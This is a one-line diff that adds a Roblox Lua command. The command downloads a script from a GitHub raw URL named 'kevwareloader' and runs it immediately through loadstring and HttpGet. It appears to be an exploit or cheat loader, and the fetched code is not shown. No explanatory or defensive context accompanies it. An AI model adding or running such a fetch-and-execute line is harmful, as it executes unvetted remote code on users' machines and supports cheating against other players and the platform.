@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ns-demon/kevwareloader/refs/heads/main/kevwareloader12.txt"))()
